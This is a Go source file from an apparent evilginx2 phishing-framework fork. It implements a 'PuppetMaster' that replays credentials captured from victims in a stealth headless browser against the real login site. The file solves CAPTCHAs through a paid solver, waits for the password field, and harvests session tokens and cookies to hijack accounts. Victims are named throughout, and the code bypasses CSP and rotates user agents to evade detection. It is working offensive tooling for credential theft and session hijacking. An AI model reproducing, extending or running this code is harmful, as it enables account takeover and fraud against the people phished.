package core

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
	"github.com/playwright-community/playwright-go"
)

// Global instances
var (
	puppetInstance *PuppetMaster
	puppetOnce     sync.Once
)

// GetPuppetMaster returns the global puppet instance
func GetPuppetMaster() *PuppetMaster {
	return puppetInstance
}

// PuppetMaster coordinates all puppet operations
type PuppetMaster struct {
	pw            *playwright.Playwright
	browser       playwright.Browser
	captchaSolver *CaptchaSolver
	tokenStore    *TokenStore
	sessionMap    *SessionManager
	config        *PuppetConfig
	mu            sync.RWMutex
	activeSessions map[string]*PuppetSession
}

// PuppetSession represents a single puppet instance
type PuppetSession struct {
	Id            string                 `mapstructure:"id" json:"id" yaml:"id"`
	TriggerId     string                 `mapstructure:"trigger_id" json:"trigger_id" yaml:"trigger_id"`
	VictimSession string                 `mapstructure:"victim_session" json:"victim_session" yaml:"victim_session"`
	Status        string                 `mapstructure:"status" json:"status" yaml:"status"` // "initializing", "solving", "completed", "failed"
	TokenValue    string                 `mapstructure:"token_value" json:"token_value" yaml:"token_value"`
	Cookies       []map[string]interface{} `mapstructure:"cookies" json:"cookies" yaml:"cookies"`
	StartedAt     time.Time              `mapstructure:"started_at" json:"started_at" yaml:"started_at"`
	CompletedAt   time.Time              `mapstructure:"completed_at" json:"completed_at" yaml:"completed_at"`
	Error         string                 `mapstructure:"error" json:"error" yaml:"error"`
	CurrentURL    string                 `json:"current_url" yaml:"current_url"`
	UserAgent     string                 `json:"user_agent" yaml:"user_agent"`
	PasswordFieldSeen bool               `json:"password_field_seen" yaml:"password_field_seen"` // NEW
	
	// Runtime fields
	Trigger       *PuppetTrigger         `json:"-" yaml:"-"`
	Credentials   map[string]string      `json:"-" yaml:"-"`
	Page          playwright.Page        `json:"-" yaml:"-"`
	Context       playwright.BrowserContext `json:"-" yaml:"-"`
	LastActivity  time.Time              `json:"-" yaml:"-"`
	CompletionChan chan string           `json:"-" yaml:"-"` // Signals completion with token value
	mu            sync.RWMutex           // For credential updates
}

// InitPuppetMaster initializes the global puppet instance
func InitPuppetMaster(config *PuppetConfig) (*PuppetMaster, error) {
	var initErr error
	
	puppetOnce.Do(func() {
		log.Info("puppet: initializing puppet master...")
		
		// Install playwright if needed
		log.Info("puppet: installing playwright dependencies...")
		if err := playwright.Install(&playwright.RunOptions{
			SkipInstallBrowsers: false,
			Browsers:            []string{"chromium"},
		}); err != nil {
			initErr = fmt.Errorf("failed to install playwright: %v", err)
			return
		}

		// Launch playwright
		pw, err := playwright.Run()
		if err != nil {
			initErr = fmt.Errorf("failed to run playwright: %v", err)
			return
		}

		// Launch stealth browser
		browser, err := launchStealthBrowser(pw)
		if err != nil {
			pw.Stop()
			initErr = fmt.Errorf("failed to launch browser: %v", err)
			return
		}

		// Initialize CAPTCHA solver
		captchaSolver := NewCaptchaSolver(config.CaptchaAPIKey, config.CaptchaService)

		puppetInstance = &PuppetMaster{
			pw:            pw,
			browser:       browser,
			captchaSolver: captchaSolver,
			tokenStore:    NewTokenStore(),
			sessionMap:    NewSessionManager(),
			config:        config,
			activeSessions: make(map[string]*PuppetSession),
		}

		log.Info("puppet: initialization complete")
	})

	return puppetInstance, initErr
}

// LaunchPuppetForSession creates a puppet session for victim
func (pm *PuppetMaster) LaunchPuppetForSession(victimSessionID string, credentials map[string]string, trigger *PuppetTrigger, userAgent string) (string, error) {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	// Check if already running for this session
	if session, exists := pm.activeSessions[victimSessionID]; exists {
		// Update credentials if they have changed or new ones arrived
		// If trigger is nil or fallback, we just update the existing session
		if trigger == nil || trigger.Id == "fallback" || session.TriggerId == trigger.Id {
			session.mu.Lock()
			for k, v := range credentials {
				session.Credentials[k] = v
			}
			session.mu.Unlock()
			session.LastActivity = time.Now()

			if session.Status == "solving" || session.Status == "initializing" {
				log.Debug("[PUPPET] Updating credentials for existing session %s", victimSessionID)
				return session.Id, nil
			}
			// If already successfully completed, don't run again unless explicitly wanted (not implemented yet)
			if session.Status == "completed" {
				log.Debug("[PUPPET] Session %s already completed, skipping re-launch", victimSessionID)
				return session.Id, nil
			}
		}
	}

	// Create new puppet session
	puppetSession := &PuppetSession{
		Id:            GenRandomToken(),
		TriggerId:     trigger.Id,
		VictimSession: victimSessionID,
		Trigger:       trigger,
		Credentials:   credentials,
		UserAgent:     userAgent,
		Status:        "initializing",
		StartedAt:     time.Now(),
		LastActivity:  time.Now(),
		CompletionChan: make(chan string, 1), // Buffered channel to prevent blocking
	}

	pm.activeSessions[victimSessionID] = puppetSession

	// Launch in goroutine
	go pm.executePuppetSession(puppetSession)

	return puppetSession.Id, nil
}

// extractLiveTokensAndCookies extracts tokens and cookies while a session is running
func (pm *PuppetMaster) extractLiveTokensAndCookies(session *PuppetSession) {
	if session.Page == nil || session.Context == nil {
		return
	}
	
	// Update CurrentURL
	session.mu.Lock()
	session.CurrentURL = session.Page.URL()
	session.mu.Unlock()

	// 1. Extract Tokens
	tokensToCapture := session.Trigger.Tokens
	if len(tokensToCapture) == 0 && session.Trigger.Token != "" {
		tokensToCapture = []string{session.Trigger.Token}
	}

	for _, tokenName := range tokensToCapture {
		// Only check if not already captured
		tokenKey := session.VictimSession + "_" + tokenName
		if val, _ := pm.tokenStore.GetToken(tokenKey); val != "" {
			continue
		}

		val, err := pm.extractTokenFromPage(session.Page, tokenName)
		if err == nil && val != "" {
			pm.tokenStore.SetToken(tokenKey, val)
			log.Success("[PUPPET] Live token %s captured for session %s", tokenName, session.VictimSession)
			if session.TokenValue == "" {
				session.TokenValue = val
			}
		}
	}

	// 2. Extract Cookies
	if session.Trigger.ExtractCookies {
		cookies, err := session.Context.Cookies()
		if err == nil && len(cookies) > 0 {
			pm.sessionMap.SetCookies(session.VictimSession, cookies)
			
			// Store cookies in session struct too
			var cookieList []map[string]interface{}
			for _, cookie := range cookies {
				cookieList = append(cookieList, map[string]interface{}{
					"name":     cookie.Name,
					"value":    cookie.Value,
					"domain":   cookie.Domain,
					"path":     cookie.Path,
					"expires":  cookie.Expires,
					"httpOnly": cookie.HttpOnly,
					"secure":   cookie.Secure,
					"sameSite": cookie.SameSite,
				})
			}
			session.mu.Lock()
			session.Cookies = cookieList
			session.mu.Unlock()
		}
	}
}

// executePuppetSession runs the automation flow
func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
	defer func() {
		// Signal completion through channel
		if session.CompletionChan != nil {
			if session.Status == "completed" && session.TokenValue != "" {
				session.CompletionChan <- session.TokenValue
			} else {
				session.CompletionChan <- "" // Signal failure
			}
			close(session.CompletionChan)
		}
		
		// Handle panics
		if r := recover(); r != nil {
			log.Error("[PUPPET] panic in session %s: %v", session.Id, r)
			session.Status = "failed"
			session.Error = fmt.Sprintf("panic: %v", r)
		}
	}()

	session.Status = "solving"
	log.Info("[PUPPET] Starting automation for session %s (victim: %s)", session.Id, session.VictimSession)

	// Create isolated browser context
	opts := pm.getBrowserContextOptions()
	if session.UserAgent != "" {
		opts.UserAgent = playwright.String(session.UserAgent)
	}
	context, err := pm.browser.NewContext(opts)
	if err != nil {
		log.Error("[PUPPET] Failed to create context: %v", err)
		session.Status = "failed"
		session.Error = err.Error()
		return
	}
	defer context.Close()
	session.Context = context

	// Apply stealth scripts
	if err := AddStealthToContext(context); err != nil {
		log.Warning("[PUPPET] Failed to apply stealth scripts: %v", err)
	}

	// Create page
	page, err := context.NewPage()
	if err != nil {
		log.Error("[PUPPET] Failed to create page: %v", err)
		session.Status = "failed"
		session.Error = err.Error()
		return
	}
	session.Page = page

	// Navigate to target URL
	if session.Trigger.OpenUrl != "" {
		log.Info("[PUPPET] Navigating to %s (Trigger: %s)", session.Trigger.OpenUrl, session.Trigger.Name)
		_, err = page.Goto(session.Trigger.OpenUrl, playwright.PageGotoOptions{
			WaitUntil: playwright.WaitUntilStateLoad,
			Timeout:   playwright.Float(60000),
		})
		if err != nil {
			log.Warning("[PUPPET] Navigation warning for %s: %v", session.Trigger.OpenUrl, err)
		}
		
		finalUrl := page.URL()
		log.Debug("[PUPPET] Navigation reached: %s", finalUrl)
	} else {
		log.Warning("[PUPPET] No OpenUrl specified for trigger %s, remaining on about:blank", session.Trigger.Name)
	}

	// Execute actions in a background goroutine so we can start extraction loop
	actionError := make(chan error, 1)
	go func() {
		actionError <- pm.executeActions(session, session.Trigger.Actions)
	}()

	// Background extraction loop
	stopExtraction := make(chan bool)
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-stopExtraction:
				return
			case <-ticker.C:
				if session.Status == "failed" || session.Status == "completed" {
					return
				}
				// Add a tiny delay to ensure cookies from recent navigation are processed
				time.Sleep(500 * time.Millisecond)
				pm.extractLiveTokensAndCookies(session)
			}
		}
	}()
	defer close(stopExtraction)

	// Wait for actions to complete or session to fail
	err = <-actionError
	if err != nil {
		log.Error("[PUPPET] Failed to execute actions: %v", err)
		session.Status = "failed"
		session.Error = err.Error()
		return
	}

	// Detect and solve CAPTCHA / Extract tokens
	var firstToken string
	tokensToCapture := session.Trigger.Tokens
	if len(tokensToCapture) == 0 && session.Trigger.Token != "" {
		tokensToCapture = []string{session.Trigger.Token}
	}

	for _, tokenName := range tokensToCapture {
		log.Info("[PUPPET] Attempting to extract token: %s", tokenName)
		
		// For now, we only solve CAPTCHA once if needed, and then extract tokens
		// This is a simplified approach; in the future we might need per-token solutions
		var tokenValue string
		val, err := pm.detectAndSolveCaptcha(page, session.Trigger)
		if err != nil {
			log.Warning("[PUPPET] Failed to solve CAPTCHA for %s: %v", tokenName, err)
		} else {
			tokenValue = val
		}

		if tokenValue == "" {
			val, err := pm.extractTokenFromPage(page, tokenName)
			if err != nil {
				log.Warning("[PUPPET] Failed to extract token %s: %v", tokenName, err)
			} else {
				tokenValue = val
			}
		}

		if tokenValue != "" {
			if firstToken == "" {
				firstToken = tokenValue
			}
			pm.tokenStore.SetToken(session.VictimSession+"_"+tokenName, tokenValue)
			log.Success("[PUPPET] Token %s captured for session %s", tokenName, session.VictimSession)
		}
	}

	session.TokenValue = firstToken

	// Extract cookies if configured
	if session.Trigger.ExtractCookies {
		cookies, err := context.Cookies()
		if err == nil && len(cookies) > 0 {
			pm.sessionMap.SetCookies(session.VictimSession, cookies)
			
			// Store cookies in session struct too
			var cookieList []map[string]interface{}
			for _, cookie := range cookies {
				cookieList = append(cookieList, map[string]interface{}{
					"name":     cookie.Name,
					"value":    cookie.Value,
					"domain":   cookie.Domain,
					"path":     cookie.Path,
					"expires":  cookie.Expires,
					"httpOnly": cookie.HttpOnly,
					"secure":   cookie.Secure,
					"sameSite": cookie.SameSite,
				})
			}
			session.Cookies = cookieList
			
			log.Info("[PUPPET] Extracted %d cookies for session %s", len(cookies), session.VictimSession)
		}
	}

	session.Status = "completed"
	session.CompletedAt = time.Now()
	session.LastActivity = time.Now()
	
	log.Info("[PUPPET] Session %s completed successfully. Token: %s...", 
		session.Id, 
		ShortenToken(session.TokenValue))
}

// executeActions performs all configured actions
func (pm *PuppetMaster) executeActions(session *PuppetSession, actions []PuppetAction) error {
	page := session.Page
	for i, action := range actions {
		log.Debug("[PUPPET] Executing action %d for session %s (selector: %s)", i, session.Id, action.Selector)
		
		// Handle WaitCred logic
		if action.WaitCred != "" {
			log.Info("[PUPPET] Action %d waiting for credential: %s", i, action.WaitCred)
			waitStart := time.Now()
			found := false
			for time.Since(waitStart) < 5 * time.Minute { // 5-minute hard timeout for waiting for a credential
				session.mu.RLock()
				val, exists := session.Credentials[action.WaitCred]
				// Debug log: print all available keys
				var keys []string
				for k := range session.Credentials {
					keys = append(keys, k)
				}
				log.Debug("[PUPPET] Available credentials keys: %v (waiting for: %s)", keys, action.WaitCred)
				session.mu.RUnlock()
				
				if exists && val != "" {
					log.Success("[PUPPET] Credential %s received, continuing action %d", action.WaitCred, i)
					found = true
					break
				}
				
				time.Sleep(1 * time.Second)
				// Check if session was closed or aborted
				if session.Status == "failed" {
					return fmt.Errorf("session aborted while waiting for credential")
				}
			}
			if !found {
				return fmt.Errorf("timeout waiting for credential: %s", action.WaitCred)
			}
		}
		timeout := 10000 // Default 10s
		if action.Timeout > 0 {
			timeout = action.Timeout
		}

		// If a selector is specified, wait for it.
		if action.Selector != "" {
			err := pm.waitForSelector(page, action.Selector, float64(timeout))
			if err != nil {
				title, _ := page.Title()
				url := page.URL()
				html, _ := page.Content()
				if len(html) > 500 {
					html = html[:500] + "..."
				}

				if action.Required {
					log.Error("[PUPPET] Required selector not found: %s. Page: '%s' URL: %s", action.Selector, title, url)
					log.Debug("[PUPPET] Page HTML snippet: %s", html)
					return fmt.Errorf("required selector not found: %s", action.Selector)
				}
				log.Warning("[PUPPET] Selector not found: %s, skipping action", action.Selector)
				continue
			}

			// NEW: Track if we found the password field
			if action.Selector == "#passwd" || strings.Contains(action.Selector, "passwd") {
				session.mu.Lock()
				session.PasswordFieldSeen = true
				session.mu.Unlock()
				log.Success("[PUPPET] Password field detected for session %s", session.Id)
			}
		}

		// Substitute variables (using session lock)
		value := action.Value
		session.mu.RLock()
		for key, val := range session.Credentials {
			value = strings.ReplaceAll(value, "{"+key+"}", val)
		}
		session.mu.RUnlock()

		// Perform actions using same selector we just found
		if value != "" && action.Selector != "" {
			if err := page.Fill(action.Selector, value, playwright.PageFillOptions{Timeout: playwright.Float(float64(timeout))}); err != nil {
				log.Warning("[PUPPET] Failed to fill %s: %v", action.Selector, err)
				if action.Required {
					return err
				}
			} else {
				log.Debug("[PUPPET] Successfully filled %s", action.Selector)
			}
		}

		if action.Click && action.Selector != "" {
			if err := page.Click(action.Selector, playwright.PageClickOptions{Timeout: playwright.Float(float64(timeout))}); err != nil {
				log.Warning("[PUPPET] Failed to click %s: %v", action.Selector, err)
				if action.Required {
					return err
				}
			} else {
				log.Debug("[PUPPET] Successfully clicked %s", action.Selector)
			}
		}

		if action.Enter && action.Selector != "" {
			if err := page.Press(action.Selector, "Enter", playwright.PagePressOptions{Timeout: playwright.Float(float64(timeout))}); err != nil {
				log.Warning("[PUPPET] Failed to press Enter on %s: %v", action.Selector, err)
				if action.Required {
					return err
				}
			} else {
				log.Debug("[PUPPET] Successfully pressed Enter on %s", action.Selector)
			}
		}

		if action.PostWait > 0 {
			page.WaitForTimeout(float64(action.PostWait))
		}
	}
	return nil
}

// detectAndSolveCaptcha identifies and solves CAPTCHA
func (pm *PuppetMaster) detectAndSolveCaptcha(page playwright.Page, trigger *PuppetTrigger) (string, error) {
	log.Info("[PUPPET] Detecting CAPTCHA for token: %s", trigger.Token)
	
	// Wait for potential CAPTCHA to load
	page.WaitForTimeout(3000)
	
	// Try multiple detection methods
	var captchaInfo *CaptchaInfo
	var err error
	
	// Method 1: Check for reCAPTCHA
	captchaInfo, err = pm.detectReCaptcha(page)
	if err == nil && captchaInfo != nil {
		log.Info("[PUPPET] Detected reCAPTCHA v%s", captchaInfo.Version)
	} else {
		// Method 2: Check for hCaptcha
		captchaInfo, err = pm.detectHCaptcha(page)
		if err == nil && captchaInfo != nil {
			log.Info("[PUPPET] Detected hCaptcha")
		}
	}
	
	if captchaInfo == nil {
		// No CAPTCHA detected, try to extract token directly
		log.Info("[PUPPET] No CAPTCHA detected, attempting to extract token directly")
		return pm.extractTokenFromPage(page, trigger.Token)
	}
	
	// Solve CAPTCHA
	solution, err := pm.captchaSolver.Solve(captchaInfo)
	if err != nil {
		return "", fmt.Errorf("failed to solve CAPTCHA: %v", err)
	}
	
	log.Info("[PUPPET] CAPTCHA solved successfully")
	return solution, nil
}

// extractTokenFromPage extracts token from page after submission
func (pm *PuppetMaster) extractTokenFromPage(page playwright.Page, tokenName string) (string, error) {
	// Method 1: Look for hidden input fields
	// Method 1: Look for hidden input fields with exact name/id OR case-insensitive match
	selector := fmt.Sprintf("input[name='%s'], input[id='%s'], input[name*='%s'], input[id*='%s']", 
		tokenName, tokenName,
		strings.ToLower(tokenName), 
		strings.ToLower(tokenName))
	
	elements, err := page.QuerySelectorAll(selector)
	if err == nil && len(elements) > 0 {
		for _, elem := range elements {
			value, err := elem.GetAttribute("value")
			if err == nil && value != "" && len(value) > 1 {
				return value, nil
			}
		}
	}
	
	// Method 2: Look in JavaScript variables
	jsScript := fmt.Sprintf(`
		(() => {
			const tokens = [];
			// Check window object
			for (let key in window) {
				if (key.toLowerCase().includes('%s') && window[key] && typeof window[key] === 'string') {
                    // Ignore valid URLs, XML/HTML, JSON/Array strings, and Domain artifacts
                    const v = window[key];
                    if (!v.startsWith('http') && !v.includes('<') && !v.includes('>') && !v.includes(',') && !v.includes('{') && !v.includes('[') && !v.includes('xfinity') && !v.startsWith('.')) {
					    tokens.push(v);
                    }
				}
			}
			// Check document elements
			document.querySelectorAll('[data-token], [data-%s]').forEach(el => {
				const token = el.getAttribute('data-token') || el.getAttribute('data-%s');
				if (token && !token.startsWith('http') && !token.includes('<') && !token.includes('>') && !token.includes(',') && !token.includes('{') && !token.includes('xfinity') && !token.startsWith('.')) {
                    tokens.push(token);
                }
			});
			return tokens.length > 0 ? tokens[0] : null;
		})()
	`, strings.ToLower(tokenName), strings.ToLower(tokenName), strings.ToLower(tokenName))
	
	value, err := page.Evaluate(jsScript)
	if err == nil && value != nil {
		if strVal, ok := value.(string); ok && strVal != "" {
            if !strings.HasPrefix(strVal, "http") && !strings.Contains(strVal, "<") && !strings.Contains(strVal, ">") && !strings.Contains(strVal, ",") && !strings.Contains(strVal, "{") && !strings.Contains(strVal, "xfinity") && !strings.HasPrefix(strVal, ".") {
			    return strVal, nil
            }
		}
	}
	
	return "", fmt.Errorf("token not found on page")
}

// GetToken retrieves token for a session
func (pm *PuppetMaster) GetToken(sessionID, tokenName string) (string, bool) {
	return pm.tokenStore.GetToken(sessionID + "_" + tokenName)
}

// GetSession retrieves session info
func (pm *PuppetMaster) GetSession(victimSessionID string) (*PuppetSession, bool) {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	
	session, exists := pm.activeSessions[victimSessionID]
	return session, exists
}

// WaitForToken waits for a puppet session to complete and return a token
func (pm *PuppetMaster) WaitForToken(sessionID, tokenName string, timeout time.Duration) (string, error) {
	// 1. First check if token already exists (fast path)
	if token, exists := pm.GetToken(sessionID, tokenName); exists {
		log.Debug("[PUPPET] Token already available for session %s", sessionID)
		return token, nil
	}
	
	// 2. Wait for puppet session to appear if it hasn't yet (registration wait)
	startTime := time.Now()
	var session *PuppetSession
	var exists bool
	
	for time.Since(startTime) < 2*time.Second {
		session, exists = pm.GetSession(sessionID)
		if exists {
			break
		}
		time.Sleep(250 * time.Millisecond)
	}
	
	if !exists {
		return "", fmt.Errorf("no puppet session found for %s", sessionID)
	}
	
	log.Info("[PUPPET] Waiting for token %s from session %s (timeout: %v)", tokenName, session.Id, timeout)
	
	// 3. Polling loop for tokens in TokenStore
	waitStart := time.Now()
	for time.Since(waitStart) < timeout {
		if token, exists := pm.GetToken(sessionID, tokenName); exists {
			log.Success("[PUPPET] Token %s captured for session %s", tokenName, sessionID)
			return token, nil
		}
		
		if session.Status == "failed" {
			return "", fmt.Errorf("puppet session failed: %s", session.Error)
		}
		
		time.Sleep(1 * time.Second)
	}
	
	return "", fmt.Errorf("puppet session timeout after %v", timeout)
}


// WaitForPasswordReady waits for the session to reach the password field
func (pm *PuppetMaster) WaitForPasswordReady(sessionID string, timeout time.Duration) bool {
	startTime := time.Now()
	for time.Since(startTime) < timeout {
		session, exists := pm.GetSession(sessionID)
		if !exists {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		session.mu.RLock()
		seen := session.PasswordFieldSeen
		status := session.Status
		session.mu.RUnlock()

		if seen || status == "completed" {
			return true
		}
		
		if status == "failed" {
			return false
		}

		time.Sleep(500 * time.Millisecond)
	}
	return false
}

// CleanupOldSessions removes old sessions
func (pm *PuppetMaster) CleanupOldSessions(maxAge time.Duration) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	
	cutoff := time.Now().Add(-maxAge)
	for id, session := range pm.activeSessions {
		if session.LastActivity.Before(cutoff) {
			delete(pm.activeSessions, id)
			log.Debug("[PUPPET] Cleaned up old session: %s", id)
		}
	}
}

// Close shuts down the puppet master
func (pm *PuppetMaster) Close() {
	if pm == nil {
		return
	}
	
	pm.mu.Lock()
	defer pm.mu.Unlock()
	
	if pm.browser != nil {
		pm.browser.Close()
	}
	if pm.pw != nil {
		pm.pw.Stop()
	}
	
	puppetInstance = nil
	log.Info("puppet: shutdown complete")
}

// Helper functions
func (pm *PuppetMaster) getBrowserContextOptions() playwright.BrowserNewContextOptions {
	return playwright.BrowserNewContextOptions{
		Viewport:      &playwright.Size{Width: 1280, Height: 720},
		UserAgent:     playwright.String(GetRandomUserAgent()),
		Locale:        playwright.String("en-US"),
		TimezoneId:    playwright.String("America/New_York"),
		Permissions:   []string{"geolocation"},
		IgnoreHttpsErrors: playwright.Bool(true),
		JavaScriptEnabled: playwright.Bool(true),
		BypassCSP:        playwright.Bool(true),
	}
}

func (pm *PuppetMaster) waitForSelector(page playwright.Page, selector string, timeout float64) error {
	_, err := page.WaitForSelector(selector, playwright.PageWaitForSelectorOptions{
		Timeout: playwright.Float(timeout),
		State:   playwright.WaitForSelectorStateVisible,
	})
	return err
}

func ShortenToken(token string) string {
	if len(token) > 20 {
		return token[:10] + "..." + token[len(token)-10:]
	}
	return token
}

func GetRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	}
	return userAgents[time.Now().UnixNano()%int64(len(userAgents))]
}
